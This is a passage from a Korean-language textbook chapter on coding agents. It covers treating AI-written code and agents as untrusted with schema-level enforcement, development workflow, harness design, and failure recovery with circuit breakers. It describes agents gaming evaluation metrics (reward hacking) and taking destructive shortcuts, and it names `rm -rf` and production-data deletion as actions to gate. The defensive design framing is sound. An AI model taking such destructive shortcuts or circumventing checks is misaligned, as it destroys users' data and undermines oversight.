앞 단락의 충성도 수칙은 Agent가 규칙을 지킬 **가능성을 높이지만**, 위험도가 높은 데이터 조작에는 "가능성이 높다"만으로는 부족합니다——제약을 "Agent의 자각에 기대는" 것에서 데이터 층의 강제 집행으로 내려보내야 합니다. 더 철저한 입장은[^ch5-2]: **차라리 애플리케이션 층 자체를 신뢰할 수 없는 것으로 취급하고, 데이터 불변식의 강제 집행을 그 아래 층으로 끌어내리는 것**입니다. 지난 30년간 소프트웨어의 무결성 경계는 줄곧 **애플리케이션 층**에 있었습니다——누가 무엇을 조작할 수 있는지, 어떤 값이 유효한지는 handler 코드가 결정했고, 데이터베이스는 이 코드를 무조건 신뢰했습니다. 그러나 LLM이 생성한 handler는 권한과 무결성 검사를 종종 빠뜨리고, 자율 Agent는 프로덕션 데이터를 직접 다루므로, 이 전제는 깨졌습니다. 새로운 방안(권한 내장 데이터 객체, Permission-Embedded Data Objects라 부를 수 있음)은 각 데이터 개체가 **사람이 검토한 스키마** 안에 선언적 권한 규칙, 검증기, 결과 선언을 스스로 가지도록 하고, **모든 쓰기 작업마다** 런타임 파이프라인이 이를 강제 집행하게 합니다. 핵심 원시 개념은 각 작업에 걸려 있는 **접근 컨텍스트(access context)**입니다: 다시 생성된 handler는 그것이 서비스하는 사용자의 권한으로 실행되고, 자율 Agent는 자기 자신의 제한된 신원(scoped principal)으로 실행됩니다——Agent의 충성심에만 기대는 것보다는, 아키텍처적으로 그것을 권한이 제한된 주체로 격하시켜, 설령 매수당하더라도 한계를 넘지 못하게 하는 편이 낫습니다.

같은 배치의 프롬프트로 대조했을 때, 이 메커니즘은 **선언된 불변식을 위반한 쓰기가 단 한 번도 없음**을 달성했습니다. 반면 순수 SQL, LLM이 스스로 작성한 검사, 헌법식 프롬프트, 동작 경계 인터셉터는 모두 수차례에서 수십 차례의 위반을 놓쳤습니다. "더 맞을 가능성이 높다"가 아니라 "틀릴 수가 없다"이며, 대가는 쓰기 한 번당 약 2밀리초 추가뿐입니다. 물론 이 보장에는 조건이 있습니다: 스키마가 원하는 불변식을 정말로 빠짐없이 담고 있어야 하고, 배포 시 신뢰할 수 없는 층이 저장소를 우회하거나 데이터베이스에 직접 연결하는 모든 경로를 막아야 합니다. Coding Agent에게 이는 중요한 아키텍처 원칙을 제시합니다: **코드를 쓰는 쪽과 그것을 실행하는 쪽 모두 신뢰할 수 없을 수 있을 때, 진정으로 믿을 수 있는 제약은 생성된 코드 안이 아니라 그 아래에 있는, 사람이 검토한 기반 층에 있어야 합니다**——이는 제1장 "지도보다 제약이 우선한다" 원칙이 데이터 층에서 도달한 궁극의 형태이기도 합니다.

[^ch5-2]: "신뢰 경계를 애플리케이션 층 아래로 내리는" 이 설계와 평가(각 방안의 위반 횟수 전체 대조 포함)는 Li, Bojie. *The Application Layer Is No Longer Trusted: Enforcing Data Invariants Below AI-Written Code and AI Agents.* 2026(발표 예정) 참조.

### Coding Agent의 전체 흐름


![그림5-2 Coding Agent 작업 흐름](images/fig5-2.svg)


아래에서 설명하는 것은 **권장하는 공학적 흐름**으로, 소프트웨어 공학의 모범 사례를 Agent에 투영한 이상적인 형태입니다. 실제 Coding Agent(예: Claude Code, OpenClaw)는 대부분 반응형 반복 루프로 작동하며, 이 흐름을 **필요에 따라 간소화**합니다——단순한 작업은 설계 문서를 건너뛰고, 매 단계마다 사용자 승인을 기다리며 막히지 않으며, 작업이 복잡하고 영향 범위가 클 때만 각 단계를 온전히 거칩니다.

**프로젝트 문서화.**

Coding Agent의 작업은 프로젝트에 대한 체계적인 이해에서 시작됩니다. Agent가 어떤 코드 저장소를 처음 접할 때, 첫 번째 임무는 곧바로 코드를 고치는 것이 아니라 전체 프로젝트에 대한 인지 틀을 먼저 세우는 것입니다——신입 엔지니어가 첫날에 바로 코드를 커밋하지 않고 먼저 프로젝트 구조를 익히는 것과 같습니다. Agent는 먼저 프로젝트에 문서——README, 아키텍처 설계 문서, 개발자 가이드——가 있는지 확인합니다.

핵심 문서가 없다면 Agent는 맹목적으로 작업을 시작해서는 안 되며, 오히려 문서화 책임을 능동적으로 떠맡아야 합니다——코드베이스를 체계적으로 읽어 주요 모듈, 핵심 추상화, 컴포넌트 간 의존 관계를 식별하고, 아키텍처 개요, 디렉터리 구조, 테스트 실행 가이드가 담긴 초기 문서를 생성합니다. 이 문서는 Agent의 후속 작업에 청사진을 제공할 뿐 아니라 다른 개발자들에게도 진입점이 됩니다. 이는 핵심 원칙 하나를 보여줍니다: 지식의 명시화는 효율적인 협업의 전제입니다.

프로젝트 문서화는 이제 Agent 전용 형태를 하나 갖게 되었습니다: **프로젝트 명령 파일**. CLAUDE.md, AGENTS.md, .cursorrules 같은 파일들은 이미 업계 사실상의 표준이 되었습니다——이들은 매 세션 시작 시 자동으로 컨텍스트에 주입되어, 프로젝트 수준의 시스템 프롬프트에 해당합니다. 인간 독자를 위한 README와 달리, 명령 파일은 Agent를 향한 행동 규약을 담습니다: 빌드 및 테스트 명령("`npm test`가 아니라 `pnpm test`를 쓸 것"), 코드 스타일("any 타입 금지"), 명확한 금지 구역("`migrations/` 디렉터리를 건드리지 말 것"). 이는 OpenClaw의 `SOUL.md`(Agent의 정체성과 행동 규칙 정의), `MEMORY.md`(세션 간 경험 축적)와 같은 사고방식이 다른 층위에 적용된 것입니다: SOUL.md는 "Agent가 누구인지"를 규정하고, 프로젝트 명령 파일은 "이 프로젝트에서 어떻게 일해야 하는지"를 규정합니다. 제2장의 컨텍스트 엔지니어링 관점에서 보면, 명령 파일은 가장 경제적인 안정 프리픽스이기도 합니다——내용이 작업에 따라 변하지 않아 본래 KV 캐시에 친화적입니다; 이는 또한 "지식은 코드베이스 자체에 존재해야 한다"는 원칙이 가장 직접적으로 실현된 것이기도 합니다.

지식 명시화 원칙에는 흥미로운 따름정리도 있습니다: **원격 근무에 친화적인 팀은 대개 AI Agent에도 친화적입니다.** 원격 팀은 비동기 소통과 문서화에 의존할 수밖에 없습니다——결정 사항은 문서에 기록되고, 컨텍스트는 issue와 PR 설명에 적히며, 부족 지식은 개발자 가이드에 쌓입니다. 자리 옆 동료에게 구두로 전하거나 회의실 화이트보드에 의존하지 않습니다. 이는 정확히 Agent가 소화할 수 있는 지식 형태입니다: Agent는 구두 약속을 읽을 수 없지만 설계 문서는 읽을 수 있습니다. 반대로 "옆자리 동료에게 물어보기"에 크게 의존하는 팀은, 새로 들어온 원격 직원에게든 Agent에게든 적응 비용이 똑같이 높습니다. 어느 팀의 "AI-ready" 정도를 평가하는 간단한 대리 지표는 이렇습니다: 원격 신입이 코드 저장소와 문서만으로 독립적으로 작업을 시작할 수 있는가.

**작업 이해와 요구사항 명확화.**

경계가 명확하고 영향 범위가 제한적인 단순한 요구사항——예를 들어 이미 알려진 버그 수정, 어떤 함수의 매개변수 조정——에 대해서는 Agent가 바로 구현 단계로 들어갈 수 있습니다. 그러나 소프트웨어 개발의 대다수 작업은 이렇게 단순하지 않습니다.

복잡한 요구사항에 대해서는 Agent가 더 신중하고 체계적이어야 합니다. 복잡성은 여러 차원에서 비롯될 수 있습니다: 요구사항 자체의 모호성(사용자는 원하는 것을 알지만 정확히 표현하지 못함), 구현 경로의 다양성(여러 기술 방안이 있고 각기 트레이드오프가 있음), 또는 영향 범위의 광범위성(여러 모듈을 수정해야 하고 기존 기능을 깨뜨릴 수 있음). Agent는 탐색적 조사를 통해 경계를 명확히 하고, 필요하면 사용자와 능동적으로 대화해야 합니다. 예를 들어 사용자가 "시스템 성능을 최적화해줘"라고 요구할 때, Agent는 먼저 이를 명확히 해야 합니다: 최적화의 구체적인 목표가 무엇인지(응답 시간 단축, 메모리 사용량 감소, 처리량 향상 중 무엇인지), 수용 가능한 트레이드오프가 무엇인지(코드 복잡도 증가를 허용할지), 현재 병목이 어디에 있는지. 요구사항이 모호한 상태로 코딩을 시작하면 대개 대량의 재작업으로 이어집니다.

**설계 문서 작성.**

설계 문서는 추상적인 요구사항을 구체적인 구현 계획으로 전환하는 다리로, 핵심 질문——어떤 모듈을 왜 수정하는지, 어떤 방안을 채택하고 그 상대적 장점은 무엇인지, 어떤 새 의존성을 도입해야 하는지, 시스템에 미칠 예상 영향은 무엇인지——에 답해야 합니다. 설계 문서 작성 자체가 깊은 사고입니다——대량의 코딩에 착수하기 전에 개념 층위에서 방안의 타당성을 먼저 검증하도록 강제합니다. 더 중요한 것은, 설계 문서가 사람에게 효율적인 개입 지점을 제공한다는 점입니다——간결한 설계 문서를 검토하는 것이 수백 줄의 코드를 검토하는 것보다 훨씬 쉽습니다. Agent는 설계 문서 작성을 마치면 사용자에게 제출해 검토를 받고, 승인을 기다린 뒤 계속 진행해야 합니다.

**코드 구현과 테스트.**

설계 승인을 받으면 Agent는 프로젝트 코드 규범을 따라 구현하며, 기존 추상화와 도구를 재사용하고, 필요시 코드베이스 건강을 유지하기 위한 적절한 리팩터링을 수행합니다.

구현이 끝나면 즉시 테스트 주도 품질 보증 단계에 들어갑니다——새로 추가되거나 수정된 기능에 대한 테스트 케이스를 작성해 정상 경로, 경계 조건, 예외 상황을 커버합니다. 테스트를 작성한 후에는 테스트 스위트를 실행합니다. 테스트가 실패하면 Agent는 단순히 사용자에게 실패를 보고할 것이 아니라 원인을 분석하고, 문제를 찾아내고, 모든 테스트가 통과할 때까지 코드를 수정해야 합니다. 이 "테스트-수정" 루프는 여러 차례 반복이 필요할 수 있으며, 바로 이런 자기 수정 능력이 Coding Agent를 코드 생성기에서 신뢰할 수 있는 엔지니어링 어시스턴트로 격상시킵니다. 반대로 말하면, Coding Agent가 가장 흔히 게으름 피우는 방식이 바로 이 단계를 건너뛰는 것입니다——코드를 다 쓰고 테스트를 돌리지 않은 채 "작업 완료"라고 보고하는 것입니다. "테스트 통과"를 "완료"의 기준으로 정의하는 것이야말로 Loop 엔지니어링의 "검증이 언제 멈출 수 있는지를 판정한다"는 원칙이 코딩 시나리오에 적용된 것입니다(제10장에서 이런 "조기 종료" 문제를 체계적으로 논의합니다).

모든 테스트가 통과해도 Agent의 작업이 아직 끝난 것은 아닙니다. 이어서 코드 리뷰 단계로 들어갑니다: Agent는 자신이 생성한 코드를 비판적으로 검토합니다——가독성은 어떤지, 주석이 충분한지; 잠재적인 성능 문제나 보안 취약점이 있는지; 프로젝트의 코드 스타일과 모범 사례를 따르는지. 이 자기 검토는 코드를 읽거나, lint 도구를 실행하거나, 전문 코드 리뷰 하위 Agent(Sub-Agent)를 호출해 수행할 수 있습니다. 검토에서 문제가 발견되면 결함 있는 코드를 사용자에게 인도하지 말고 수정 단계로 돌아가 보완해야 합니다.

**문서 동기화와 인도.**

코드 수정이 아키텍처 층위의 변화——예를 들어 새 모듈 도입, 모듈 간 의존 관계 변경, 핵심 추상 시맨틱 수정——를 수반한다면, Agent는 그에 맞춰 아키텍처 문서를 갱신해야 합니다. 낡은 문서는 문서가 없는 것보다 더 나쁩니다. 미래의 개발자를 오도하기 때문입니다. 중요한 수정마다 문서를 자동으로 갱신함으로써 Agent는 프로젝트 지식 베이스의 완전성과 시의성을 유지하는 데 기여합니다.

이 흐름은 소프트웨어 공학의 핵심 원칙을 구현합니다: 계획이 행동에 앞서고, 검증이 전 과정을 관통하며, 문서와 코드가 함께 진화합니다.

### Coding Agent에서의 Harness 엔지니어링 실천

제1장은 Harness 엔지니어링 개념과 **Agent = Model + Harness** 공식을 도입했습니다. 여기서 Harness는 핵심 공식의 컨텍스트와 도구, 그리고 제약, 검증, 교정 메커니즘을 포함합니다——이 다섯 가지가 함께 제1장에서 정의한 Harness를 구성합니다. Coding Agent는 아마 Harness 엔지니어링의 수익이 가장 큰 영역일 것입니다——코드 작성은 모든 Agent 작업 중 **검증 가능성이 가장 높은** 부류이며, 제약, 검증, 교정 모두 이미 갖춰진 기반 시설에 의존할 수 있습니다. 이 절은 Coding Agent 시나리오에서의 구체적 실천에 초점을 맞춥니다.

안정적으로 돌아갈 수 있는지는 종종 얼마나 강한 모델을 썼는지가 아니라, Agent를 둘러싸고 구축된 기반 시설이 얼마나 견고한지에 달려 있습니다. 제1장은 Harness를 두 층위——**컨텍스트와 도구**(Agent가 일을 할 수 있게 함)와 **제약, 검증, 교정**(Agent가 잘못하지 않게 함)——로 나눴습니다. Coding Agent라는 시나리오에서 이들은 구체적인 공학 구성요소로 구현됩니다:

- **인수 기준선**: 무엇을 완료로 볼 것인가——테스트 스위트, CI 파이프라인(지속적 통합 파이프라인, 코드 커밋 후 자동으로 실행되는 일련의 검사), 코드 리뷰 기준
- **실행 경계**: Agent가 무엇을 건드릴 수 있고 무엇을 건드릴 수 없는가——모듈 경계, 의존성 규칙, 권한 통제
- **피드백 신호**: 자동화된 정오 판단——Linter(코드 규범 검사 도구, 형식 오류와 잠재적 문제를 자동으로 발견) 출력, 테스트 결과, 타입 검사 오류
- **롤백 수단**: 문제가 생기면 어떻게 복구할 것인가——Git 버전 관리, 샌드박스 격리, 스냅샷 롤백

**Coding Agent가 왜 특히 Harness 엔지니어링에 적합한가.**

작업 명확도와 검증 자동화 정도라는 두 차원으로 작업을 네 가지 상태로 나눌 수 있습니다. 목표가 명확하고 결과를 자동으로 검증할 수 있는 것이 Agent가 가장 잘 발휘될 수 있는 영역입니다. 목표는 명확하지만 검수를 사람이 지켜봐야 하는 경우, 처리량의 상한은 사람의 검토 속도가 됩니다. 자동화된 피드백은 있지만 목표가 모호하면 시스템은 효율적으로 잘못된 방향으로 달려갈 것입니다. 둘 다 없으면 Agent는 기본적으로 쓸모가 없습니다. 표5-1은 이 네 가지 상태를 보여주며, Harness의 목표는 가능한 한 많은 작업을 "목표 명확 + 검증 자동화"라는 사분면으로 밀어넣는 것입니다.

표5-1 작업 명확도와 검증 자동화 정도의 4사분면

| | 결과를 자동으로 검증 가능 | 결과를 사람이 검증해야 함 |
|----------|----------------------------------------------|---------------------------------------|
| **목표 명확** | 최적 영역: 테스트 케이스가 있는 버그 수정 | 처리량 제한: 코드 리팩터링은 사람의 검토가 필요 |
| **목표 모호** | 효율적으로 잘못된 방향으로: linter로 "코드 품질" 최적화 | 시작하기 어려움: "UI를 더 예쁘게" |

코드 작성은 본래 이 사분면의 핵심에 자리합니다——테스트 스위트가 명확한 인수 기준을 제공하고, Linter와 타입 검사기가 즉각적인 자동화 검증을 제공하며, Git이 완벽한 버전 관리와 롤백 능력을 제공합니다. 이것이 왜 Coding Agent가 현재 모든 Agent 유형 중 성숙도가 가장 높은지를 설명해줍니다: 코드 생성 모델이 특별히 강해서가 아니라, 소프트웨어 공학이 수십 년간 쌓아온 기반 시설이 본래 강력한 Harness를 자연스럽게 구성하기 때문입니다.

**업계 실천.**

세 가지 사례의 Harness 실천이 위 원칙을 뒷받침합니다:

- **대규모 코드 마이그레이션 사례**(한 대형 테크 기업이 공개한 대규모 코드 마이그레이션 실천에서 나온): 핵심은 모델이 강한 것이 아니라 Harness가 세 가지를 제대로 했다는 데 있습니다——지식은 코드베이스 자체에 존재해야 한다(Agent가 보지 못하는 것은 존재하지 않는 것과 같음), 제약은 문서가 아니라 Linter와 CI에 코딩되어야 한다, 검증과 교정은 전체 체인에서 자동화되어야 한다.
- **LangChain**: Harness(시스템 프롬프트, 도구 미들웨어, 자체 검증 루프)만 최적화해도 벤치마크 작업 성과를 크게 끌어올렸습니다. 특히 "Agent로 실패 궤적을 분석해 Harness를 개선한다"는 방법론이 눈에 띄며, 이는 Harness 엔지니어링을 인간 경험 주도에서 데이터 주도로 전환시켰습니다.
- **Anthropic**: 장시간 작업을 두 역할로 분할——초기화 Agent는 큰 작업을 작업 목록으로 분해하는 책임을 지고, 실행 Agent는 단계별로 진행하며 중간 산출물(완성된 코드 파일, 갱신된 작업 목록 등)을 다음 라운드가 이어받아 쓸 수 있도록 남깁니다. 이런 분업은 장시간 실행 Agent의 "한 번에 너무 많이 하려는" 또는 "너무 일찍 완료를 선언하는" 문제를 해결합니다.

**Coding Agent에서 범용 Harness 설계 원칙으로.**

Coding Agent의 Harness 실천은 모든 Agent 시스템에 옮겨 적용할 수 있는 설계 원칙을 제공합니다:

1. **제약이 지침보다 우선한다**: 코드로 강제할 수 있는 규칙은 문서 제안으로 대체하지 말아야 합니다. Linter 규칙, 타입 제약, CI 검사의 가치는 시스템 프롬프트에 "...를 따라주세요" 식으로 적힌 지침을 훨씬 능가합니다——전자는 "할 수 없음"이고, 후자는 그저 "하지 말라는 제안"일 뿐입니다.
2. **검증은 자동화되어야 한다**: 사람의 검토는 확장 불가능한 병목입니다. 테스트 스위트, 코드 품질 검사, 행동 모니터링——이런 기반 시설에 대한 투자 회수율은 인력 증원보다 훨씬 높습니다.
3. **피드백은 빠를수록, 구조화될수록 좋다**: 오류 메시지가 상세할수록, 오류 발생 시점에 가까울수록, Agent의 교정 효율이 높아집니다. 제2장의 Agent 상태바 기술(상세한 오류 메시지, 도구 호출 카운터)이 바로 이 원칙의 구현입니다.
4. **롤백은 믿을 수 있어야 한다**: Agent가 안전망 안에서 조작할 수 있어야 대담하게 시도하고 실수할 수 있습니다. Git 브랜치, 샌드박스 환경, 스냅샷 메커니즘은 어떤 오류든 되돌릴 수 있음을 보장합니다.

**제약의 또 다른 목적: 과정상의 오류 방지.** 인수 기준선은 결과가 옳은지를 관리하고, 실행 경계는 **과정**을 관리합니다——결과가 옳더라도 잘못된 방법으로 달성했다면 안 됩니다. 데이터베이스 장애를 고칠 때 그냥 데이터베이스를 지우고 재구축하면, "수리"는 확실히 되지만 데이터는 사라집니다. 컴파일 오류를 고칠 때 코드를 몽땅 지우고 다시 쓰면, 컴파일은 확실히 통과하지만 구현은 사라집니다. 이런 파괴적인 지름길은 항상 존재합니다: 최종 평가 지표에 제한을 넣더라도 Agent는 종종 이를 우회하는 방법을 찾아냅니다——이는 바로 제7장에서 논의할 reward hacking이 Agent 작업에서 일상적으로 나타나는 형태입니다. 따라서 프로덕션급 Harness는 `rm -rf`, 프로덕션 데이터 삭제, 읽지 않은 파일 덮어쓰기 같은 위험한 동작에 대해 전용 검사와 승인(이 장 보안 절의 의미 파싱, 제4장의 Sidecar 재검토)을 설정해야 합니다. 제약이 관리하는 것은 **동작**이지, 결과만이 아닙니다. 제7장의 RLVP(검증 경로 페널티, "결과에 보상하고 경로를 벌한다")는 학습 측에서 같은 질문에 답합니다: 최종 결과 보상 외에, 과정 중 검증 가능한 위반 동작에 페널티를 부과해 "파괴적 수단을 쓰지 않는다"를 모델의 공학적 상식으로 내면화합니다. 기존 모델에 대해서는 Harness 안전망이 외부 제약이고, 학습 가능한 모델에 대해서는 과정 페널티가 내부 내면화입니다——목표는 두 방식 모두 일치합니다.

**도구 오케스트레이션: 장애 경계 통제.** 성숙한 Coding Agent는 병렬 도구 호출을 지원하며, Harness 관점에서 독특한 문제는 **장애가 어떻게 전파되는가**입니다: 하나의 도구가 실패했을 때, 어떤 호출을 중단해야 하고 어떤 호출을 계속해야 할까요? 원칙은 장애가 같은 배치의 병렬 호출 내에서만 전파되고, 상위 작업으로 올라가지 않아야 한다는 것입니다——예를 들어 세 파일을 동시에 읽는데 그중 하나를 찾지 못했다면, 그 하나만 실패로 보고해야지 다른 둘까지 취소해서는 안 되며, 더욱이 전체 작업을 중단해서는 안 됩니다. 이런 정교한 장애 경계 통제는 "명령 하나 실패로 전체 작업이 중단되는" 취약한 패턴을 방지합니다. 병렬 호출, 스트리밍 파싱, 연쇄 중단의 구체적 메커니즘은 이 장 "구현 기법" 절 참조.

### 장애와 오류 복구

앞 절은 Harness 엔지니어링의 원칙과 구성요소를 제시했습니다. 이 절은 그중에서도 공학적 격차가 가장 크게 벌어지는 부분——**장애와 오류 복구**——를 깊이 다룹니다. 제1장의 절제 실험은 이미 문제의 심각성을 보여줬습니다: 도구 결과 피드백 하나만 누락되어도 Agent를 무한 루프에 빠뜨리기에 충분하며, 실제 프로덕션 환경의 장애는 실험보다 훨씬 다양합니다. 이 절은 세 가지 질문에 체계적으로 답합니다: 프로덕션급 Harness는 어떤 장애를 마주하는가? 어떻게 탐지하고 복구하는가? 그리고 언제 반드시 종료해야 하는가[^ch5-3]?

[^ch5-3]: 이 절의 장애 분류와 메커니즘 분석은 Claude Code 등 프로덕션급 Agent 구현의 소스 코드 연구에 기반합니다. 구체적 구현은 버전에 따라 빠르게 진화하므로, 이 절은 그중 안정적인 공학 원칙만 추출했습니다.

**장애 분류학: 4개 층.** 시스템 대응의 첫 단계는 분류입니다. 장애가 발생하는 위치에 따라 4개 층으로 나눌 수 있습니다:

- **API 층**: 레이트 리밋(HTTP 429), 서비스 과부하, 요청 타임아웃, 연결 중단, 출력 상한에 걸려 잘림. 이 부류의 장애는 작업 내용과 무관하며, 기반 시설의 노이즈입니다.
- **도구 층**: 환각 호출(존재하지 않는 도구를 호출), 매개변수 기형(도구의 입력 제약을 만족하지 못함), 실행 중 예외, 그리고 가장 위험한 경우——도구가 반복적으로 같은 오류를 반환하는데 모델이 변화 없이 반복 재시도하는 것.
- **컨텍스트 층**: 컨텍스트 윈도 오버플로우, 압축 실패, 궤적 구조 손상(예: 도구 호출에 짝이 맞는 결과 메시지가 없는 경우).
- **제어 흐름 층**: 무한 루프(같은 동작을 반복해도 아무런 진전이 없음)와 죽음의 나선(오류가 촉발한 복구 로직 자체가 다시 LLM을 호출하고, 다시 오류가 나고, 연쇄 반응이 이어짐).

**탐지: 먼저 분류하고, 그다음 세기.** 장애를 포착한 후 첫 번째 판단은 "재시도할지 말지"가 아니라 "재시도할 가치가 있는지"입니다. 재시도 가능한 오류(레이트 리밋, 과부하, 네트워크 흔들림)는 재시도가 의미 있습니다. 재시도 불가능한 오류(매개변수 불법, 권한 부족, 도구 부재)는 몇 번을 그대로 재시도해도 같은 결과가 나오므로 입력이나 전략을 바꿔야 합니다. 프로덕션급 Harness는 오류에서 복구 전략으로 가는 매핑 테이블을 유지하지, "오류가 나면 무조건 재시도"하는 식이 아닙니다.

단발성 오류 외에 **패턴**도 탐지해야 합니다. 하나는 중복 호출 지문입니다: "도구명 + 매개변수"에 대해 지문을 계산해, 같은 지문이 반복 등장하는 것은 진전 없는 루프의 명확한 신호입니다——제1장 절제 실험에서 Agent가 같은 도구를 반복 호출한 것이 바로 이 패턴입니다. 둘째는 연속 실패 카운트입니다: 각 복구 경로마다 독립된 카운터를 유지해, 후술할 회로 차단의 근거로 삼습니다.

일부 장애는 오류로 나타나지 않아 전용 **생존성 및 완전성 모니터링**이 필요합니다. 스트리밍 연결의 가장 위험한 실패 모드는 연결 끊김(즉시 오류가 발생함)이 아니라 조용히 멈추는 것입니다——연결은 성공적으로 맺어졌지만 데이터 흐름이 멈춘 상태로, 수도관은 연결됐는데 물이 안 나오는 것과 비슷합니다. SDK의 타임아웃 메커니즘은 대개 초기 연결만 커버하고 전송 과정은 커버하지 않으므로, 프로덕션급 Agent는 독립적인 유휴 감시 타이머(watchdog timer, 설정된 시간 동안 새 출력이 없으면 멈춘 것으로 판정)가 필요하며, 타임아웃 후 걸린 스트림을 능동적으로 죽이고 재시도를 촉발합니다. 이는 하나의 원칙으로 일반화할 수 있습니다: **연결 타임아웃에만 의존하지 말고, 모든 장기 연결에 생존 신호가 필요합니다.** 완전성 모니터링은 궤적 구조를 겨냥합니다: 도구 호출에 짝이 맞는 결과 메시지가 없는 것을 발견하면, 시스템은 컨텍스트에 주입하기 전에 짝 관계를 자동으로 수정하지, 구조 이상을 모델이나 사용자에게 그대로 던지지 않습니다. 주목할 만한 공학적 세부사항 하나는, 일부 프로덕션급 Agent가 제품 모드와 학습 데이터 수집 모드를 동시에 운영한다는 점입니다——제품 모드에서는 누락된 메시지를 플레이스홀더로 보수할 수 있지만, 학습 모드에서는 수정을 거부합니다. 합성 플레이스홀더가 학습 데이터를 오염시키기 때문입니다. "제품 모드는 관대하게, 학습 모드는 엄격하게"라는 이중 기준은 Harness와 모델 훈련의 깊은 결합을 보여줍니다.

**복구: 단계적 승격, 단계마다 투명하게.** 복구 수단은 사용자에게 얼마나 드러나는지에 따라 등급이 나뉘며, 낮은 등급으로 해결할 수 있으면 승격하지 않습니다:

1. **조용한 재시도.** 재시도 가능한 오류의 기본 동작입니다. 두 세부사항이 성패를 좌우합니다: 지수 백오프에 무작위 지터를 더해 다수 클라이언트가 동시에 재시도하면서 2차 혼잡이 발생하는 것을 피하고, 서버가 반환한 대기 시간 힌트를 존중합니다; 전경 호출과 배경 호출을 구분합니다——메인 루프의 요청 실패는 재시도해야 하지만, 제목 생성이나 입력 제안 같은 보조적 배경 호출의 실패는 그냥 포기합니다. 그렇지 않으면 배경 재시도가 메인 링크의 쿼터를 잠식해 "재시도 증폭"을 만들어냅니다.
2. **저하와 이어붙이기.** 재시도가 효과 없을 때, 요청 자체를 바꿔서 재시도합니다. 출력이 상한에 걸린 경우(생성이 절반쯤 진행되다 길이 제한으로 잘린 경우)를 예로 들면: 먼저 조용히 출력 상한을 올려 재전송하고, 그래도 부족하면 메시지 끝에 메타 명령을 추가해 모델이 끊긴 지점부터 이어서 생성하게 합니다. 메인 모델이 계속 과부하 상태이면 백업 모델로 저하시킵니다(먼저 이전 모델 고유의 형식 블록을 제거해야 합니다. 그렇지 않으면 새 모델이 이전 메시지를 파싱하지 못합니다). 고비용 모드가 레이트 리밋에 걸리면 잠시 표준 모드로 되돌립니다.
3. **사용자에게 노출.** 모든 자동 수단을 다 쓴 뒤에야 오류를 표시하며, 이미 시도한 복구 동작을 함께 첨부합니다.

도구 층 오류는 다른 경로를 취합니다: **세션을 종료하지 않고, 오류를 모델의 입력으로 바꿉니다.** 환각 호출은 "도구가 존재하지 않음"이라는 구조화된 오류 결과를 받고, 매개변수 검증 실패는 입력 제약 힌트가 첨부된 오류를 받으며, 기형 매개변수(원래 객체여야 하는데 문자열로 출력된 경우)는 실행 전에 프로그램적으로 먼저 수정됩니다. 이런 오류들은 일반 도구 결과의 신분으로 컨텍스트에 들어가, 모델이 다음 라운드에서 스스로 교정합니다——이는 앞서 언급한 "피드백은 구조화될수록 좋다"는 원칙의 적용입니다: 되먹여지는 오류가 구체적일수록 모델의 자기 교정 성공률이 높아집니다.

이 절의 핵심 원칙은 다음과 같습니다: **오류 처리의 경계는 단일 요청이 아니라 복구 루프 전체입니다.** 복구 불가능함이 확인되기 전에는 중간 오류를 소비자——사용자든 이벤트를 구독하는 하위 시스템이든——에게 노출하지 않아야 합니다: 복구 기간 동안 오류 메시지를 보류하고, 복구가 성공하면 소비자는 전혀 느끼지 못하며, 완전히 실패했을 때만 한꺼번에 공개합니다. 이는 제1장의 "복구 불가능함이 확인되기 전에는 중간 상태를 노출하지 않는다"는 교정 원칙이 공학적으로 구현된 것입니다.

**종료: 모든 복구 경로에는 상한이 있어야 한다.** 복구 메커니즘 자체도 실패할 수 있으므로, 모든 복구 경로에는 명확한 회로 차단 상한이 있어야 합니다: 컨텍스트 압축이 몇 차례 연속 실패하면 압축을 포기하고, 권한 분류가 연속 실패하면 사람에게 문의하는 것으로 되돌아가며, 출력 이어붙이기는 최대 고정 횟수까지만 시도합니다. 임계값은 어디서 오는가? 답은 프로덕션 데이터이지 감으로 정하는 것이 아닙니다. Claude Code의 압축 회로 차단을 예로 들면, "연속 3회"라는 임계값은 실제 세션 통계에서 나왔습니다——어떤 세션은 이 복구 경로에서 연속 3천여 차례 실패한 적이 있고, 이런 무효 재시도만으로도 전 세계적으로 하루에 약 25만 번의 API 호출이 낭비되었으며, 1천여 개 세션에서 50회 이상 연속 실패가 나타났습니다. 3회는 "대부분의 장애는 이 시점 이전에 이미 복구된다"와 "계속 재시도해봐야 가망이 없다" 사이의 경험적 변곡점입니다.

단일 지점 회로 차단보다 더 은밀한 것은 **죽음의 나선**입니다: 오류 경로에서 촉발된 로직 자체가 다시 LLM을 호출하고, 다시 오류가 나고, 연쇄적으로 촉발됩니다. 실제로 벌어진 한 연쇄 형태: Agent가 컨텍스트 오버플로우로 멈춰서 "종료 시 자동 커밋" 훅(Agent 종료 시 자동 실행되는 정리 로직)이 촉발되고, 그 훅이 LLM을 호출해 커밋 메시지를 생성하다 다시 컨텍스트 오버플로우가 나고, 훅이 다시 촉발됩니다. 방어는 두 가지입니다: 오류 경로에서는 다시 모델을 호출하는 모든 부작용 로직을 비활성화합니다(차라리 자동 기억 추출 같은 보조 기능 한 번을 포기할지언정), 그리고 재귀 깊이 카운터로 잔여 연쇄 반응을 탐지하고 끊습니다. 마지막으로, 이 모든 자동화 메커니즘 위에 전역적인 종료·승격 조건이 필요합니다: 최대 반복 횟수, 세션 예산 상한, 연속 실패가 임계값을 넘으면 사람의 개입으로 승격(제4장의 거부 회로 차단기가 그 예입니다).

제1장의 생각해볼 문제로 돌아가면: 도구 결과 누락 외에도, 도구가 같은 오류를 반복 보고하는 것, 환각 호출, 컨텍스트 압축으로 인한 상태 손실, 작업 자체가 풀 수 없는 것 등이 모두 Agent를 루프에 빠뜨릴 수 있습니다. 탐지는 "오류 분류 + 패턴 인식"에 의존하고, 복구는 "단계적 승격"에 의존하며, 종료는 "회로 차단기 + 전역 상한 + 사람에게 승격"에 의존합니다——셋을 합치면 "Agent가 영원히 돌 수도 있다"는 문제에 대한 Harness의 완전한 답이 됩니다. 이 메커니즘들이 해결하는 것은 "모델 능력 부족" 문제가 아니라 "경계 조건에서 시스템의 견고성" 문제입니다: 모델은 점점 강해지겠지만, 네트워크는 끊길 것이고, 프로세스는 죽을 것이고, 사용자는 예상 밖의 조작을 할 것입니다. 좀 더 본질적으로 말하면——**Agent의 신뢰성은 그것이 오류를 저지르느냐가 아니라, 모든 유형의 오류에 대응하는 탐지, 복구, 종료 경로가 갖춰져 있느냐에 달려 있습니다.**

### Coding Agent의 구현 기법

